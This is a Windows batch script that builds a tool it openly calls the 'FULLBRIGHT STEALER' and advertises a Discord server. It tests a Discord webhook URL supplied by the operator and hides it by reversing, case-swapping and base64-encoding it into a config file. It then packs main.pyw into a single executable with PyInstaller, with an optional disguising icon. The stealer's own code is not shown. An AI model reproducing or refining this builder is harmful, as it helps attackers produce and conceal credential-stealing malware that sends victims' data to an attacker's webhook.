@echo off
cls
color 04
echo WELCOME TO FULLBRIGHT STEALER BY RAYWZW-JOIN https://discord.gg/aGpfgnW4aW
timeout /t 2 /nobreak >nul
cls
echo Installing dependencies from requirements.txt...
pip install -r requirements.txt
echo Please enter your Discord webhook URL:
set /p WEBHOOK_URI=Webhook URL:
:validateWebhook
echo Testing webhook...
curl -H "Content-Type: application/json" -X POST -d "{\"content\": \"Webhook works\"}" %WEBHOOK_URI%
if %errorlevel% neq 0 (
echo Invalid webhook URL, please try again.
set /p WEBHOOK_URI=Webhook URL:
goto validateWebhook
)
for /f "delims=" %%i in ('echo %WEBHOOK_URI% ^| python -c "import sys,base64; s=sys.stdin.read().strip()[::-1]; print(s.swapcase());"') do set REVERSED_SWAPPED_WEBHOOK=%%i
for /f "delims=" %%i in ('echo %REVERSED_SWAPPED_WEBHOOK% ^| python -c "import sys,base64; print(base64.b64encode(sys.stdin.read().strip().encode('utf-8')).decode('utf-8'))"') do set ENCODED_WEBHOOK=%%i
(
echo WEBHOOK_URI = '%ENCODED_WEBHOOK%'
) > co/config.py
echo Please enter the path to the .ico icon file (Press Enter for no icon):
set /p ICON_PATH=Icon Path:
if "%ICON_PATH%"=="" (
echo No icon provided, proceeding without icon...
pyinstaller --onefile --exclude-module pyopencv --exclude-module _lzma --exclude-module _multiprocessing --exclude-module attrs --exclude-module cryptography --exclude-module pytorch --exclude-module torch --exclude-module numpy --exclude-module Cython --exclude-module flask --exclude-module cv2 --exclude-module PyQt5 --exclude-module win32 --exclude-module yaml --exclude-module PythonWin --exclude-module jedi --exclude-module sounddevice --exclude-module google --exclude-module zstandard --hidden-import pyautogui --name main main.pyw
) else (
echo Using icon: %ICON_PATH%
pyinstaller --onefile --exclude-module pyopencv --exclude-module _lzma --exclude-module _multiprocessing --exclude-module attrs --exclude-module cryptography --exclude-module pytorch --exclude-module torch --exclude-module numpy --exclude-module Cython --exclude-module flask --exclude-module cv2 --exclude-module PyQt5 --exclude-module win32 --exclude-module yaml --exclude-module PythonWin --exclude-module jedi --exclude-module sounddevice --exclude-module google --exclude-module zstandard --hidden-import pyautogui --name main --icon "%ICON_PATH%" main.pyw
)
echo exe built in dist folder
echo Cleaning up...
del main.spec
rd /s /q build
pause
